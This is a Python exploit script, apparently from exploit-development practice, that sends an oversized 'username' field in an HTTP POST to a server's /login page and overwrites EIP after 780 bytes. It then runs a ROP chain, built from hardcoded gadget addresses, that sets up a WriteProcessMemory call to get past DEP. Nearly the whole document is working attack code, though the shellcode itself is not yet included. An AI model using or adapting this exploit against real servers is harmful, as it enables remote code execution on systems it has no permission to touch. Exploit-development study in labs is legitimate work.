#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 80
  size = 1500

  wpm = b"\x45\x45\x45\x45"         # WriteProcessMemory Address
  wpm += b"\xe0\x7d\x16\x10"        # Shellcode return address (0x10167de0)
  wpm += b"\xff\xff\xff\xff"        # pseudo Process handle (-1)
  wpm += b"\xe0\x7d\x16\x10"        # Code cave address (0x10167de0)
  wpm += b"\x46\x46\x46\x46"        # dummy lpBuffer
  wpm += b"\x47\x47\x47\x47"        # dummy nSize
  wpm += b"\x44\xc0\x20\x10"        # lpNumberOfBytesWritten (0x1020c044)

  filler = b"A" * (780 - len(wpm))  # Offset to EIP
  #### Saving ESP
  # Save ESP in ESI
  eip = pack("<L", 0x10154112)  # push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret
  #### Locating WPM placeholder address
  rop = b"B" * 4                # padding for ESP
  rop += pack("<L", 0x100656f7) # mov eax, esi ; pop esi ; ret
  rop += pack('<L', 0x45454545) # junk for pop esi
  rop += pack('<L', 0x1005e9f5) # pop ebp ; ret
  rop += pack("<L", 0xffffffdc) # pop -0x24 to ebp
  rop += pack("<L", 0x100fcd71) # add eax, ebp ; dec ecx ; ret
  rop += pack("<L", 0x100cb4d4) # xchg eax, edx ; ret
  # EDX ==> WPM Skeleton
  #### Patching  WPM placeholder address
  rop += pack("<L", 0x10157413) # pop eax ; retn 0x000C
  rop += pack("<L", 0xfffec0f0) # negative offset to WPM
  rop += pack("<L", 0x1002b11b) # neg eax ; ret 0x0004
  rop += pack("<L", 0x45454545) # junk for retn 0x000C
  rop += pack("<L", 0x45454545) # junk for retn 0x000C
  rop += pack("<L", 0x45454545) # junk for retn 0x000C
  rop += pack("<L", 0x100cdc7a) # xchg eax, ebp ; ret
  rop += pack("<L", 0x45454545) # junk for retn 0x0004
  rop += pack("<L", 0x10157413) # pop eax ; retn 0x000C
  rop += pack("<L", 0x10168060) # IAT Address of KERNEL32!CreateFileA
  rop += pack("<L", 0x1014dc4c) # mov eax, dword [eax] ; ret
  rop += pack("<L", 0x45454545) # junk for retn 0x000C
  rop += pack("<L", 0x45454545) # junk for retn 0x000C
  rop += pack("<L", 0x45454545) # junk for retn 0x000C
  rop += pack("<L", 0x100fcd71) # add eax, ebp ; dec ecx ; ret
  rop += pack("<L", 0x1012d24e) # mov dword [edx], eax ; ret
  #### Patching lpBuffer
  # Step 1: Aligning EDX to the location of the lpBuffer placeholder
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  # Step 2: Adding 210 bytes
  rop += pack("<L", 0x10157413)  # pop eax ; retn 0x000C
  rop += pack("<L", 0xfffffdf0)  # -0x210
  rop += pack("<L", 0x1002b11b)  # neg eax ; ret 0x0004
  rop += pack('<L', 0x45454545)  # junk for the retn 0x000C
  rop += pack('<L', 0x45454545)  # junk for the retn 0x000C
  rop += pack('<L', 0x45454545)  # junk for the retn 0x000C
  rop += pack("<L", 0x1003f9f9)  # add eax, edx ; retn 0x0004
  rop += pack('<L', 0x45454545)  # junk for the retn 0x0004
  # Step 3: Patching lpBuffer
  rop += pack('<L', 0x1012d3ce)  # mov dword [edx], eax ; ret
  rop += pack('<L', 0x45454545)  # junk for the retn 0x0004
  #### Patching nSize
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x100bb1f4)  # inc edx ; ret
  rop += pack("<L", 0x10157413)  # pop eax ; retn 0x000C
  rop += pack("<L", 0xfffffe58)  # negative nSize
  rop += pack("<L", 0x1002b11b)  # neg eax ; ret 0x0004
  rop += pack("<L", 0x45454545)  # junk for retn 0x000C
  rop += pack("<L", 0x45454545)  # junk for retn 0x000C
  rop += pack("<L", 0x45454545)  # junk for retn 0x000C
  rop += pack("<L", 0x1012d24e)  # mov dword [edx], eax ; ret
  rop += pack("<L", 0x45454545)  # junk for retn 0x0004
  rop += b"C" * (size - len(filler) - len(wpm) - len(eip))
  inputBuffer = filler + wpm + eip + rop
  print(str(len(filler+wpm)))
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://192.168.100.127/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
